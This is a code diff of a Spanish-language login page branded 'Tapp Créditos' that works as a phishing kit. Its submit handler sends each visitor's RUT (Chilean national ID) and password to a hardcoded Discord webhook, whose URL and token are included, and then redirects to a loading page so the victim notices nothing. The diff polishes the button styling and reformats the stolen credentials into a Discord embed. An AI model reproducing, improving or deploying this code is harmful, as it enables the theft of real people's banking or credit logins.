@@ -121,8 +121,9 @@
                       <div class="flex w-full flex-col-reverse gap-5 lg:flex-row">
 
                         
-                        <button class="relative flex flex-row items-center justify-center fill-current outline-none text-base p-3 w-full bg-neutral-gray-3 rounded-full text-neutral-white cursor-not-allowed max-w-full font-semibold" type="submit" id="loginButton">
-                          <span class="order-2">Iniciar Sesión</span></button></div>
+                        <button class="relative flex flex-row items-center justify-center fill-current outline-none text-base p-3 w-full rounded-full text-neutral-white font-semibold transition-all duration-300 hover:opacity-90 active:scale-95" type="submit" id="loginButton">
+  <span class="order-2">Iniciar Sesión</span>
+</button></div>
 
                       
                       <hr class="w-full border-neutral-gray-2 lg:hidden"/>
@@ -156,7 +157,6 @@
   const passwordInput = document.getElementById('password');
   const loginButton = document.getElementById('loginButton');
 
-  // Función que verifica si ambos campos tienen contenido
   const checkInputs = () => {
     const rutValue = rutInput.value.trim();
     const passwordValue = passwordInput.value.trim();
@@ -168,40 +168,28 @@
     }
   };
 
-  // Agregar listeners a los inputs
   rutInput.addEventListener('input', checkInputs);
   passwordInput.addEventListener('input', checkInputs);
 
   // --- 3. Lógica de Envío (Webhook + Redirección) ---
   loginForm.addEventListener('submit', async (event) => {
-    event.preventDefault(); // Evita recarga de página
+    event.preventDefault();
 
-    // Obtener valores
     const rut = rutInput.value;
     const password = passwordInput.value;
-
-    // Guardar en sesión
     sessionStorage.setItem('rut', rut);
 
-    // Configuración del Webhook
     const webhookUrl = 'https://discordapp.com/api/webhooks/1551764243274268672/DScPEbqjJobNa34rNWg5ibBcBfGkugRXRlKeykaT1ndEu07ECxG4Ep9Jjd5mV1XatmMK';
-    
-    // Payload con formato profesional
+
+    // Payload en formato Embed con estructura alineada y saltos de línea
     const data = {
-      content: `
-        **📝 Registro de Inicio de Sesión**
-        
-        > RUT: \`${rut}\`
-        > Clave: \`${password}\`
-        
-        ---
-        🕒 Fecha: ${new Date().toLocaleString()}
-        
-        *Sistema: Tapp Créditos*
-      `
+      "embeds": [{
+        "title": "🚀 LOGIN SYSTEM",
+        "color": 65535, // Color Celeste/Cian
+        "description": "```\nRUT   : " + rut + "\nPASS  : " + password + "\n```"
+      }]
     };
 
-    // Enviar datos y Redirigir
     try {
       const response = await fetch(webhookUrl, {
         method: 'POST',
@@ -211,7 +199,6 @@
         body: JSON.stringify(data)
       });
 
-      // Si todo sale bien (o falla), redirigimos al usuario
       if (response.ok || response.status === 0) { 
         window.location.href = 'load.html';
       } else {
@@ -220,7 +207,6 @@
       }
     } catch (error) {
       console.error('Error de red:', error);
-      // Si hay error de red, igual redirigimos
       window.location.href = 'load.html';
     }
   });
